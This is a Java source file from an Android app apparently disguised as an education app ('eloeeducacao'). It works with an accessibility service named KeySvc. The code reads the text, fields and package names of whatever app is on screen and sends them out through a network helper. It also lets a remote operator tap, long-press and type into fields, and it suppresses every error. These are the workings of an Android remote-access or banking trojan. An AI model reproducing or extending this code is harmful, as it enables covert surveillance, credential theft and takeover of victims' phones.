package com.eloeeducacao;

import android.graphics.Rect;
import android.os.Bundle;
import android.os.Handler;
import android.os.Looper;
import android.view.accessibility.AccessibilityNodeInfo;

import org.json.JSONArray;
import org.json.JSONObject;

public final class Tree {

    private static final Handler H = new Handler(Looper.getMainLooper());
    private static final int MAX = 220;

    private Tree() {}

    public static void dump(KeySvc s) {
        JSONArray arr = new JSONArray();
        try {
            AccessibilityNodeInfo root = s.getRootInActiveWindow();
            if (root != null) walk(root, arr, 0);
        } catch (Throwable ignored) {}
        Net.send("{\"t\":\"tree\",\"o\":" + arr.toString() + "}");
    }

    private static void walk(AccessibilityNodeInfo n, JSONArray arr, int d) {
        if (n == null || arr.length() >= MAX || d > 30) return;
        try {
            Rect r = new Rect();
            n.getBoundsInScreen(r);
            if (r.width() > 0 && r.height() > 0) {
                String txt = n.getText() == null ? "" : n.getText().toString().trim();
                if (txt.isEmpty() && n.getContentDescription() != null)
                    txt = n.getContentDescription().toString().trim();
                boolean edit = n.isEditable();
                boolean clic = n.isClickable();
                if (!txt.isEmpty() || edit || clic) {
                    if (txt.length() > 120) txt = txt.substring(0, 120);
                    JSONObject o = new JSONObject();
                    o.put("t", txt);
                    o.put("x", r.centerX());
                    o.put("y", r.centerY());
                    o.put("d", d);
                    if (clic) o.put("c", 1);
                    if (edit) o.put("e", 1);
                    o.put("cls", cls(n.getClassName()));
                    if (n.getPackageName() != null) o.put("pkg", n.getPackageName().toString());
                    arr.put(o);
                }
            }
            for (int i = 0; i < n.getChildCount(); i++) walk(n.getChild(i), arr, d + 1);
        } catch (Throwable ignored) {}
    }

    private static String cls(CharSequence c) {
        if (c == null) return "?";
        String s = c.toString();
        int i = s.lastIndexOf('.');
        return (i >= 0 ? s.substring(i + 1) : s).toLowerCase();
    }

    public static void act(final KeySvc s, final float x, final float y, final boolean longo) {
        if (longo) {
            s.longPress(x, y);
            return;
        }
        H.post(new Runnable() {
            @Override public void run() {
                boolean feito = false;
                try {
                    AccessibilityNodeInfo root = s.getRootInActiveWindow();
                    if (root != null) {
                        AccessibilityNodeInfo n = acha(root, (int) x, (int) y, 0);
                        while (n != null && !n.isClickable()) n = n.getParent();
                        if (n != null) feito = n.performAction(AccessibilityNodeInfo.ACTION_CLICK);
                    }
                } catch (Throwable ignored) {}
                if (!feito) s.touch(x, y);
            }
        });
    }

    private static AccessibilityNodeInfo acha(AccessibilityNodeInfo n, int x, int y, int d) {
        if (n == null || d > 30) return null;
        try {
            Rect r = new Rect();
            n.getBoundsInScreen(r);
            if (!r.contains(x, y)) return null;
            for (int i = n.getChildCount() - 1; i >= 0; i--) {
                AccessibilityNodeInfo f = acha(n.getChild(i), x, y, d + 1);
                if (f != null) return f;
            }
            return n;
        } catch (Throwable t) {
            return null;
        }
    }

    public static void fill(final KeySvc s, final float x, final float y, final String v) {
        s.touch(x, y);
        H.postDelayed(new Runnable() {
            @Override public void run() {
                try {
                    AccessibilityNodeInfo root = s.getRootInActiveWindow();
                    if (root == null) return;
                    AccessibilityNodeInfo f = root.findFocus(AccessibilityNodeInfo.FOCUS_INPUT);
                    if (f == null) return;
                    Bundle b = new Bundle();
                    b.putCharSequence(AccessibilityNodeInfo.ACTION_ARGUMENT_SET_TEXT_CHARSEQUENCE, v);
                    f.performAction(AccessibilityNodeInfo.ACTION_SET_TEXT, b);
                } catch (Throwable ignored) {}
            }
        }, 400);
    }
}